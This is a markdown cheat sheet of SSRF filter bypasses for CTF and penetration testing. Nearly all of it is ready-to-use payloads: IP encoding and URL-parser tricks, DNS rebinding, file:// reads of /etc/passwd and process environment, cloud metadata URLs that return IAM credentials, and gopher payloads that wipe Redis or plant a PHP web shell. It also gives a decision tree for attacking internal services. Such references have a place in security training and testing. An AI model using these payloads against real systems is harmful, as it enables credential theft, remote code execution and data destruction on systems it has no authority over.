# SSRF (Server-Side Request Forgery) Bypass — Complete Reference

> Scope: Bypassing URL validators, IP blacklists, and scheme restrictions to reach internal services.

---

## 1. Quick Diagnosis

Test these to confirm SSRF exists:

```
?url=http://127.0.0.1/
?url=http://localhost/
?url=http://0.0.0.0/
?url=http://[::1]/
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info
?url=http://169.254.169.254/latest/meta-data/    # AWS IMDS
```

> **Tip**: Use Burp Collaborator / interactsh / your own DNS server to confirm outbound requests.

---

## 2. IP Address Bypass (IP 黑名单绕过)

When `127.0.0.1`, `localhost`, and `192.168.x.x` are blocked.

### 2.1 Same Address, Different Representation

| Representation | Value | Works when... |
|---------------|-------|---------------|
| `127.0.0.1` | Standard | Not blocked |
| `0177.0.0.1` | Octal | Parser accepts octal |
| `0177.1` | Octal shorthand | Some parsers |
| `2130706433` | Integer (decimal) | Very rare |
| `0x7f000001` | Hex integer | Very rare |
| `0x7f.0x0.0x0.0x1` | Hex per octet | Some parsers |
| `127.1` | Shorthand (127.0.0.1) | Common! |
| `127.0.1` | Shorthand | Common |
| `0` | Resolves to 0.0.0.0 → 127.0.0.1 on some systems | Rare |

### 2.2 IPv6

```
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

### 2.3 DNS Resolution Tricks

```
http://127.0.0.1.xip.io/          # xip.io resolves to prefix
http://127.0.0.1.nip.io/          # nip.io same
http://1u.ms/                     # Various redirect services
http://make-127.0.0.1-rebind-169-254-169-254.nr-ax.com/  # DNS rebinding
```

### 2.4 DNS Rebinding (DNS 重绑定)

1. Register a domain with **TTL=0**
2. First DNS query returns a benign IP (e.g., `1.2.3.4`)
3. Validator caches / accepts this IP
4. Second DNS query (from the actual HTTP request) returns `127.0.0.1`
5. Server connects to `127.0.0.1`

Tools:
- `https://lock.cmpxchg8b.com/rebinder.html`
- `https://github.com/Neo23x0/DNSrebinder`

### 2.5 Redirect Bypass

Host a redirect on an allowed domain that points to a forbidden IP:

```php
<?php header("Location: http://127.0.0.1/flag"); ?>
```

If the validator only checks the **initial** URL, the redirect target bypasses the check.

### 2.6 IDN / Punycode

```
http://localhost。example.com     # Fullwidth period
http://⑫⑦.⓪.⓪.①                  # Circled digits
```

---

## 3. URL Parsing Differences (解析差异)

Different libraries parse URLs differently. Exploit the gap between validator and requester.

### 3.1 `@` Trick (Authority confusion)

```
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
http://127.0.0.1?@evil.com/
```

- `urllib.parse.urlparse('http://evil.com@127.0.0.1/')` → netloc=`evil.com@127.0.0.1`
- But `requests.get()` → connects to `127.0.0.1`

### 3.2 `#` Fragment Trick

```
http://127.0.0.1#@example.com/
```

Some validators strip `#` and everything after it, but the requester includes it in the path.

### 3.3 Path Traversal in URL

```
http://127.0.0.1%00example.com/
http://127.0.0.1/example.com/../
```

### 3.4 Scheme Confusion

```
http:127.0.0.1           # Missing //
http:/127.0.0.1          # Single /
http:///127.0.0.1        # Triple /
http://\127.0.0.1        # Backslash (Windows)
```

### 3.5 Case Sensitivity in Scheme

```
Http://127.0.0.1/
HTTP://127.0.0.1/
hTtP://127.0.0.1/
```

Some filters only check lowercase `http`.

---

## 4. Protocol / Scheme Bypass (协议绕过)

When `http://` and `https://` are the only allowed schemes.

### 4.1 Case Variation
```
HTTP://127.0.0.1/
HtTp://127.0.0.1/
```

### 4.2 Whitespace / Control Characters
```
http:// 127.0.0.1/        # Some parsers strip spaces
http%3A%2F%2F127.0.0.1/   # Full URL encoding
```

### 4.3 Alternative HTTP-like Schemes
```
ftp://127.0.0.1/
sftp://127.0.0.1/
tftp://127.0.0.1/
```

### 4.4 File Protocol
```
file:///etc/passwd
file:///C:/Windows/win.ini
file:///proc/self/environ
file:///var/www/html/flag.php
```

### 4.5 Dict Protocol (Service probing)
```
dict://127.0.0.1:6379/info      # Redis
dict://127.0.0.1:11211/stats    # Memcached
dict://127.0.0.1:3306/          # MySQL (limited)
```

### 4.6 Gopher Protocol ⭐

Gopher is the **most powerful** SSRF vector because it lets you send arbitrary TCP payloads.

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

**Redis via Gopher**:
```
gopher://127.0.0.1:6379/_AUTH%20password%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C?php%20system($_GET[cmd]);?%3E%22%0d%0aSAVE%0d%0a
```

**MySQL via Gopher**:
```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00...
```

Tool: `https://github.com/tarunkant/Gopherus`

### 4.7 FTP Protocol
```
ftp://127.0.0.1:21/
ftp://anonymous:anonymous@127.0.0.1/
```

---

## 5. Cloud Metadata Services (云元数据服务)

If you can reach `169.254.169.254`, read cloud instance metadata.

### 5.1 AWS EC2 IMDS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
```

> **IMDSv2**: Requires a session token. First `PUT` to `http://169.254.169.254/latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then use the token.

### 5.2 Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
```

### 5.3 Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
```

### 5.4 Azure
```
http://169.254.169.254/metadata/instance?api-version=2017-08-01
# Requires header: Metadata: true
```

### 5.5 Huawei Cloud
```
http://169.254.169.254/openstack/latest/meta_data.json
```

---

## 6. Internal Service Enumeration (内网服务探测)

```
http://127.0.0.1:80/
http://127.0.0.1:3306/          # MySQL
http://127.0.0.1:6379/          # Redis
http://127.0.0.1:8080/          # Tomcat/Jenkins
http://127.0.0.1:9200/_cat      # Elasticsearch
http://127.0.0.1:50070/         # Hadoop NameNode
http://127.0.0.1:5984/_all_dbs  # CouchDB
http://127.0.0.1:27017/         # MongoDB
http://127.0.0.1:11211/         # Memcached
```

---

## 7. HTTP Parameter Pollution (HPP) for SSRF

```
?url=http://allowed.com&url=http://127.0.0.1/
```

Some frameworks concatenate parameters or use the last one, while the WAF only checks the first.

---

## 8. Known CTF / Real-World Cases

| Challenge / Case | Key Technique | Payload |
|-----------------|---------------|---------|
| [CTF] Basic SSRF | localhost bypass | `http://127.1/` |
| [CTF] URL parser diff | `@` trick | `http://evil.com@127.0.0.1/` |
| [CTF] Scheme filter | Gopher | `gopher://127.0.0.1:6379/_FLUSHALL` |
| [CTF] IP blacklist | DNS rebinding | Custom domain with TTL=0 |
| [HackerOne] CapitalOne | AWS IMDS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| [HackerOne] Shopify | URL parser confusion | `http://127.0.0.1%00example.com` |

---

## 9. Decision Tree

```
1. Can you reach 127.0.0.1?
   ├── YES → Enumerate internal services (ports 80, 3306, 6379, 9200, 8080)
   │          ├── Service responds → Craft protocol-specific payload
   │          │   ├── Redis → Gopher protocol
   │          │   ├── MySQL → Gopher / direct SQL
   │          │   ├── HTTP internal → Browse for admin/flag
   │          │   └── Elasticsearch → Query for sensitive data
   │          └── No response → Try file://, dict://, ftp://
   │
   └── NO → Bypass IP blacklist:
       ├── Try 127.1, 0177.0.0.1, [::1]
       ├── Try DNS tricks (xip.io, nip.io)
       ├── Try DNS rebinding
       ├── Try @ trick: evil.com@127.0.0.1
       ├── Try redirect from allowed domain
       └── Try URL parser differences
```
